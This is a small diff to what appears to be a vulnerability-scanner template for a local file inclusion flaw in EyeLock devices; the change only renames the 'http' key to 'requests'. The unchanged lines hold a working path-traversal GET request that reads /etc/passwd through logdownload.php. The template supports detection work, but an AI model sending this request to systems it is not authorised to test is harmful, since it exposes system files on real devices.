@@ -8,7 +8,7 @@ info:
   reference: https://www.zeroscience.mk/codes/eyelock_lfd.txt
   tags: iot,lfi,eyelock
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd"
